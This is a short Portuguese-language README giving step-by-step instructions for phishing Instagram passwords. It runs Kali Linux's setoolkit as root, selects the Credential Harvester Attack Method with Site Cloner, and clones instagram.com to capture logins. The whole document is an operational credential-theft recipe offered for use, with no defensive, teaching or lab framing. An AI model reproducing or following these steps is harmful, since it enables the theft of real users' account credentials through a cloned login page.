# Phishing para captura de senhas no instagram

### Ferramentas Necessarias

- Kali Linux
- setoolkit

### Configurando o Phishing no Kali Linux

1. Tenha acesso ao __root__: ``` sudo su ```
2. Inicie o __setoolkit__: ``` setoolkit ```
3. Nos tipos de ataques, selecione: ``` Social-Engineering Attacks ```
4. Selecione Vetor de ataque: ``` Web Site Attack Vectors ```
5. E no Metodo de ataque: ```Credential Harvester Attack Method ```
6. E em seguida: ``` Site Cloner ```
7. Depois desse processo, aparecerar o endereço da máquina, caso não apareça, digite: ``` ifconfig ```
8. Por ultimo o URL para clone: http://www.instagram.com
